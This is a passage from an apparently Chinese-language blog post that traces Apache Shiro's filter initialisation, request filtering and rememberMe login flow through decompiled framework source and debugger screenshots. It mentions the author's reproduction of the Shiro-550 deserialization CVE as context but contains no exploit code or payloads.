<li><code>shiroFilterFactoryBean</code> → 依赖于 <code>securityManager</code> ，在 <code>securityManager</code> 初始化后初始化。</li>
</ol>
<h4 id="userRealm"><a href="#userRealm" class="headerlink" title="userRealm"></a>userRealm</h4><p>没啥好说的，继承自 Shiro 提供的 <code>AuthorizingRealm</code> 类，可以利用 Shiro 的内置方法进行认证和授权。比如通过重写的 <code>doGetAuthorizationInfo</code> 和 <code>doGetAuthenticationInfo</code> 方法，访问数据库，获取认证信息，并通过shiro的api进行认证或授权。正如之前所说 Realm 用于从数据存储中获取安全数据（如用户、角色和权限信息）。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109030234509.png" alt="image-20241109030234509"></p>
<h4 id="securityManager"><a href="#securityManager" class="headerlink" title="securityManager"></a>securityManager</h4><p>在方法中创建 <code>DefaultWebSecurityManager</code> 实例。设置其关联的 <code>Realm</code> 。这里主要是通过 <code>securityManager.setRealm(userRealm);</code> 语句，将自定义的 <code>UserRealm</code> 配置到 SecurityManager 中。</p>
<h4 id="shiroFilterFactoryBean"><a href="#shiroFilterFactoryBean" class="headerlink" title="shiroFilterFactoryBean"></a>shiroFilterFactoryBean</h4><p>这个就值得好好说一说了。首先我们这是配置了一个集成 Apache Shiro 安全框架的过滤器工厂 Bean。<code>ShiroFilterFactoryBean</code>实现了 Spring 的 <code>FactoryBean</code> 接口。 <code>FactoryBean</code> 提供了一种创建复杂或动态 Bean 实例的机制，允许延迟和定制实例化过程。通过实现 <code>FactoryBean</code>，<code>ShiroFilterFactoryBean</code> 可以通过重写 <code>getObject()</code> 方法来返回实际需要在 Spring 上下文中使用的对象，而不仅仅是 <code>ShiroFilterFactoryBean </code>自身。在这里，我们可以追到 <code>createInstance()</code> 方法，发现返回的是 <code>SpringShiroFilter</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.instance == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.instance = <span class="built_in">this</span>.createInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> AbstractShiroFilter <span class="title function_">createInstance</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SpringShiroFilter</span>((WebSecurityManager)securityManager, chainResolver);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109150817355.png" alt="image-20241109150817355"></p>
<p>我们先整体看 <code>SpringShiroFilter</code> 类，是一个过滤器，继承了 <code>javax.servlet.Filter</code>，在Spring初始化的时候，会遍历每个Bean，并获取该Bean的 <code>description(描述)</code>，而 <code>SpringShiroFilter</code>，由于继承关系，其描述为 <code>filter getShiroFilterFactoryBean</code>，可以看到前缀是filter，标识其为一个过滤器。然后会将其注册到Web应用程序上下文（<code>ServletContext</code>）中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109160837114.png" alt="image-20241109160837114"></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109172730069.png" alt="image-20241109172730069"></p>
<p>然后在<code>org.apache.catalina.core.StandardContext#addFilterMapBefore</code>中将过滤器的映射规则添加到应用程序中的映射集合中。可以看到<code>SpringShiroFilter</code>的<code>urlPatterns</code>属性是<code>/*</code>，即希望所有的请求都会通过该过滤器。因此我们所有的请求都会在shiro的过滤器中进行二次处理。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109173444914.png" alt="image-20241109173444914"></p>
<p>接着我们在细看 <code>SpringShiroFilter</code> 类的内部，前面提到了其实例化是通过调用重写的 <code>FactoryBean</code> 接口的 <code>getObject</code> 方法得到的。并且具体代码是在 <code>getObject</code> 方法调用的 <code>createInstance</code> 方法中，因此关注 <code>ShiroFilterFactoryBean#createInstance</code> 方法。那么提取出完整的该函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> AbstractShiroFilter <span class="title function_">createInstance</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    log.debug(<span class="string">&quot;Creating Shiro Filter instance.&quot;</span>);</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="built_in">this</span>.getSecurityManager();</span><br><span class="line">    String msg;</span><br><span class="line">    <span class="keyword">if</span> (securityManager == <span class="literal">null</span>) &#123;</span><br><span class="line">        msg = <span class="string">&quot;SecurityManager property must be set.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanInitializationException</span>(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(securityManager <span class="keyword">instanceof</span> WebSecurityManager)) &#123;</span><br><span class="line">        msg = <span class="string">&quot;The security manager does not implement the WebSecurityManager interface.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanInitializationException</span>(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">FilterChainManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="built_in">this</span>.createFilterChainManager();</span><br><span class="line">        <span class="type">PathMatchingFilterChainResolver</span> <span class="variable">chainResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PathMatchingFilterChainResolver</span>();</span><br><span class="line">        chainResolver.setFilterChainManager(manager);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SpringShiroFilter</span>((WebSecurityManager)securityManager, chainResolver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在构造<code>SpringShiroFilter</code>类的时候，调用其构造函数传入二楼两个变量，<code>securityManager</code> 和 <code>chainResolver</code>，<code>securityManager</code> 就是当前类的<code>securityManager</code> 属性，在我们的Shiro配置类中初始化的时候就设置了，其值就是Shiro配置类中我们设置的<code>securityManager Bean</code>的实例。如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 DefaultWebSecurityManager</span></span><br><span class="line"><span class="meta">@Bean(name = &quot;securityManager&quot;)</span></span><br><span class="line"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier(&quot;userRealm&quot;)</span> UserRealm userRealm)</span> &#123;</span><br><span class="line">    <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">    securityManager.setRealm(userRealm);</span><br><span class="line">    <span class="keyword">return</span> securityManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>chainResolver</code>是一个<code>PathMatchingFilterChainResolver</code>类，大概意思是路径匹配过滤器链解析器。类图如下，初始化的时候会设置<code>filterChainManager</code>属性，当然如果初始化调用的是是无参构造函数，就会new一个<code>FilterChainManager</code>对象，不过后续任然可以调用其<code>setFilterChainManager</code>方法来设置自己配置的<code>FilterChainManager</code>对象。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241109225015958.png" alt="image-20241109225015958"></p>
<p><code>chainResolver</code>就是通过<code>setFilterChainManager</code>方法设置<code>filterChainManager</code>的。具体的值是通过<code>createFilterChainManager</code>方法来获取的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> FilterChainManager <span class="title function_">createFilterChainManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultFilterChainManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilterChainManager</span>();</span><br><span class="line">    Map&lt;String, Filter&gt; defaultFilters = manager.getFilters();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var3</span> <span class="operator">=</span> defaultFilters.values().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var3.hasNext()) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> (Filter)var3.next();</span><br><span class="line">        <span class="built_in">this</span>.applyGlobalPropertiesIfNecessary(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Filter&gt; filters = <span class="built_in">this</span>.getFilters();</span><br><span class="line">    String name;</span><br><span class="line">    Filter filter;</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(filters)) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var10</span> <span class="operator">=</span> filters.entrySet().iterator(); var10.hasNext(); manager.addFilter(name, filter, <span class="literal">false</span>)) &#123;</span><br><span class="line">            Map.Entry&lt;String, Filter&gt; entry = (Map.Entry)var10.next();</span><br><span class="line">            name = (String)entry.getKey();</span><br><span class="line">            filter = (Filter)entry.getValue();</span><br><span class="line">            <span class="built_in">this</span>.applyGlobalPropertiesIfNecessary(filter);</span><br><span class="line">            <span class="keyword">if</span> (filter <span class="keyword">instanceof</span> Nameable) &#123;</span><br><span class="line">                ((Nameable)filter).setName(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, String&gt; chains = <span class="built_in">this</span>.getFilterChainDefinitionMap();</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(chains)) &#123;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var12</span> <span class="operator">=</span> chains.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, String&gt; entry = (Map.Entry)var12.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">            <span class="type">String</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> (String)entry.getValue();</span><br><span class="line">            manager.createChain(url, chainDefinition);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> manager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是创建默认的过滤器链管理器，初始化的时候，会把shiro的默认过滤器的Class对象都添加进去。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110010711879.png" alt="image-20241110010711879"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultFilter</span> &#123;</span><br><span class="line">    anon(AnonymousFilter.class),</span><br><span class="line">    authc(FormAuthenticationFilter.class),</span><br><span class="line">    authcBasic(BasicHttpAuthenticationFilter.class),</span><br><span class="line">    authcBearer(BearerHttpAuthenticationFilter.class),</span><br><span class="line">    logout(LogoutFilter.class),</span><br><span class="line">    noSessionCreation(NoSessionCreationFilter.class),</span><br><span class="line">    perms(PermissionsAuthorizationFilter.class),</span><br><span class="line">    port(PortFilter.class),</span><br><span class="line">    rest(HttpMethodPermissionFilter.class),</span><br><span class="line">    roles(RolesAuthorizationFilter.class),</span><br><span class="line">    ssl(SslFilter.class),</span><br><span class="line">    user(UserFilter.class);</span><br><span class="line"></span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后遍历每个过滤器，对其调用<code>applyGlobalPropertiesIfNecessary</code>方法，将每个过滤器应用全局属性。简单来说就是通过查看当前 URL 的设置是否为默认值或未设置，来决定是否应用一些全局配置的 URL。比如我修改某个url，就会遍历过滤器。这样所有相关的过滤器都会一起调整设置。我们设置的<code>LoginUr</code>l是<code>/toLogin</code>，可以看到会把所有相关过滤器的<code>LoginUrl</code>从<code>/login.jsp</code>设置成<code>/toLogin</code></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110020033445.png" alt="image-20241110020033445"></p>
<p>然后回到<code>ShiroFilterFactoryBean#createFilterChainManager</code>，检查其filters属性是否为空，这里是空，直接跳过if语句，刚刚我们只是处理了从默认过滤器链管理器得到的过滤器。接着获取过滤器链定义映射。对应我们前面这两行代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filterMap.put(<span class="string">&quot;/user/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(filterMap);</span><br></pre></td></tr></table></figure>

<p>因此获取到的就是<code>&#123;/user/*=authc&#125;</code>这个Map，获取到键和值，将authc对应的过滤器与&#x2F;user&#x2F;*路径包装起来。这样才算完成一个过滤链管理器<code>FilterChainManager</code>的初始化，其属性不仅有Shiro的默认过滤器，还将过滤器和url包装在了一起。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110025149268.png" alt="image-20241110025149268"></p>
<p>将路径匹配过滤器链解析器<code>chainResolver</code>的<code>FilterChainManager</code>属性设置为刚刚创建出来的过滤链管理器<code>manager</code>。然后就是我们最开始提到的<code>securityManager</code> 和 <code>chainResolver</code>设置进<code>SpringShiroFilter</code>了。</p>
<h3 id="过滤流程"><a href="#过滤流程" class="headerlink" title="过滤流程"></a>过滤流程</h3><p>关于Tomcat Filter的一些知识可以参考：<a target="_blank" rel="noopener" href="https://cmisl.github.io/2024/07/23/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/#Filter%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">JAVA内存马系列 - cmisl_破站</a></p>
<p>那么Tomcat会调用过滤链<code>filterChain</code>的<code>doFilter</code>方法，从第一个过滤器的<code>doFilter</code>链式调用下去。而过滤器链filterChain的创建是从<code>filterMaps</code>获取过滤器的名称，再用名称去上下文得到对应过滤器的配置去生成的。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110040841149.png" alt="image-20241110040841149"></p>
<p>由前面初始化流程的分析，我们的<code>SpringShiroFilter</code>会被配置进<code>filterMaps</code>，那么在过滤链中也有其一席之地。所以，在链式调用<code>doFilter</code>时，也会调到<code>SpringShiroFilter</code>。而由于其本身没有doFilter方法，所以会调到其父类的父类<code>OncePerRequestFilter</code>的<code>doFilter</code>方法中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110041134055.png" alt="image-20241110041134055"></p>
<p><code>OncePerRequestFilter#doFilter</code>方法调用<code>doFilterInternal</code>方法，<code>SpringShiroFilter</code>又没有，而其父类有，那就调到了其父类，也是一个抽象类的<code>AbstractShiroFilter#doFilterInternal</code>中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, <span class="keyword">final</span> FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="built_in">this</span>.prepareServletRequest(servletRequest, servletResponse, chain);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="built_in">this</span>.prepareServletResponse(request, servletResponse, chain);</span><br><span class="line">        <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> <span class="built_in">this</span>.createSubject(request, response);</span><br><span class="line">        subject.execute(<span class="keyword">new</span> <span class="title class_">Callable</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                AbstractShiroFilter.<span class="built_in">this</span>.updateSessionLastAccessTime(request, response);</span><br><span class="line">                AbstractShiroFilter.<span class="built_in">this</span>.executeChain(request, response, chain);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从请求中创建一个<code>subject</code>，代表当前会话，然后调用<code>execute</code>进行可执行操作。接着就是一顺调用，直到<code>AbstractShiroFilter#getExecutionChain</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> FilterChain <span class="title function_">getExecutionChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain origChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChain</span> <span class="variable">chain</span> <span class="operator">=</span> origChain;</span><br><span class="line">    <span class="type">FilterChainResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getFilterChainResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;No FilterChainResolver configured.  Returning original FilterChain.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> origChain;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> chain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取过滤链解析器<code>resolver</code>，其值正是初始化时的 <code>chainResolver</code>。是一个<code>PathMatchingFilterChainResolver</code>类，因此顺着来到了<code>PathMatchingFilterChainResolver#getChain</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChainManager</span> <span class="variable">filterChainManager</span> <span class="operator">=</span> <span class="built_in">this</span>.getFilterChainManager();</span><br><span class="line">    <span class="keyword">if</span> (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> <span class="built_in">this</span>.getPathWithinApplication(request);</span><br><span class="line">        <span class="keyword">if</span> (requestURI != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;/&quot;</span>.equals(requestURI) &amp;&amp; requestURI.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            requestURI = requestURI.substring(<span class="number">0</span>, requestURI.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var6</span> <span class="operator">=</span> filterChainManager.getChainNames().iterator();</span><br><span class="line"></span><br><span class="line">        String pathPattern;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var6.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pathPattern = (String)var6.next();</span><br><span class="line">            <span class="keyword">if</span> (pathPattern != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;/&quot;</span>.equals(pathPattern) &amp;&amp; pathPattern.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                pathPattern = pathPattern.substring(<span class="number">0</span>, pathPattern.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span>(!<span class="built_in">this</span>.pathMatches(pathPattern, requestURI));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Matched path pattern [&quot;</span> + pathPattern + <span class="string">&quot;] for requestURI [&quot;</span> + Encode.forHtml(requestURI) + <span class="string">&quot;].  Utilizing corresponding filter chain...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码首先获取一个<code>filterChainManager</code>，同样，值是我们初始化<code>SpringShiroFilter</code>时的<code>securityManager</code>参数。然后会获取请求url，然后经过一个简单的判断保证url不以<code>/</code>符号结尾(根目录除外)。遍历 <code>filterChainManager</code> 中所有的路径模式，寻找与 <code>requestURI</code> 匹配的路径模式。路径匹配是通过调用 <code>pathMatches(pathPattern, requestURI)</code> 方法来实现。具体可以追到<code>AntPathMatcher#doMatch</code>方法中。</p>
<p>然后匹配成功调用<code>filterChainManager.proxy(originalChain, pathPattern)</code>第一个参数是原始过滤连，第二个是匹配到的路径。比如我访问<code>/user/add</code>，而由我们前面的配置，访问<code>/user/*</code>会进入<code>authc</code>对应的过滤器，即<code>FormAuthenticationFilter</code>。所以我们会匹配到<code>/user/*</code>这个路径，因此进入这个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`<span class="keyword">public</span> FilterChain <span class="title function_">proxy</span><span class="params">(FilterChain original, String chainName)</span> &#123;</span><br><span class="line">    <span class="type">NamedFilterList</span> <span class="variable">configured</span> <span class="operator">=</span> <span class="built_in">this</span>.getChain(chainName);</span><br><span class="line">    <span class="keyword">if</span> (configured == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;There is no configured chain under the name/key [&quot;</span> + chainName + <span class="string">&quot;].&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> configured.proxy(original);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据匹配的路径获取与其相关联的 <code>NamedFilterList</code>，这是一个过滤器列表，代表了一组有序的过滤器。据此去<code>SimpleNamedFilterList#proxy</code>获取一个代理过滤链，封装了原始过滤链和匹配路径与其过滤器。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110051141163.png" alt="image-20241110051141163"></p>
<p>返回后调用其<code>doFiler</code>方法。并在其中调用<code>FormAuthenticationFilter的doFilter</code>方法。此时也是成功调到对应的Shiro过滤器了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241110051307654.png" alt="image-20241110051307654"></p>
<h3 id="登录流程-个人补充"><a href="#登录流程-个人补充" class="headerlink" title="登录流程(个人补充)"></a>登录流程(个人补充)</h3><p>在复现CVE-2016-4437(Shiro-550反序列化漏洞)的时候，想了解一下正常登录的流程，于是补充了这里的内容，因此用到的环境也是shiro-spring1.2.4。</p>
<p>经过过滤器过滤之后，请求就会被Springboot的serlvet处理，而我们是登录请求，根据接口就会来到<code>UserController#doLoginPage</code>方法。用user、password、rememberMe创建token后，用<code>org.apache.shiro.subject.support.DelegatingSubject#login</code>方法进行登录处理。可以顺着直接来到<code>org.apache.shiro.mgt.DefaultSecurityManager#login</code>方法。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116044713568.png" alt="image-20241116044713568"></p>
<p>当前的subject只是一个对于http请求的subject，只是用来处理了访问路径权限调用过滤器的。现在就需要用它作为参数，创造一个新的subject，而创造出来的这个新的subject是通过身份验证后创建或更新的，表示一个已认证的用户。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116045141943.png" alt="image-20241116045141943"></p>
<p>创建一个 <code>SubjectContext</code>，设置了一些认证信息。使用重写的<code> createSubject</code> 方法根据<code> SubjectContext</code> 创建并返回一个新的 Subject 对象。又是一顿解析认证信息，我们可以关注一些对Principals的解析，因为Shiro550就是该值的反序列化问题。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116050848822.png" alt="image-20241116050848822"></p>
<p>从身份验证信息中提取<code>Principals</code>。后续就是调用<code>org.apache.shiro.web.mgt.DefaultWebSubjectFactory#createSubject</code>，将解析过后的context作为参数，通过再一次解析，new一个subject出来。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116051214288.png" alt="image-20241116051214288"></p>
<p>回到<code>org.apache.shiro.mgt.DefaultSecurityManager#login</code>方法，调用<code>onSuccessfulLogin</code>，用于处理登录后的一些操作。我们直接来到关键部分。调用序列化器去序列化<code>Principals</code>。并且将序列化的结果用<code>encrypt</code>方法加密之后再返回。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116052014077.png" alt="image-20241116052014077"></p>
<p>序列化的结果拿去Base64编码然后设置为Cookie。该类时<code>CookieRememberMeManager</code>，初始化的时候<code>cookie</code>的<code>name</code>就是<code>rememberMe</code>。所以赋值的就是赋给了<code>rememberMe</code>。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116053021719.png" alt="image-20241116053021719"></p>
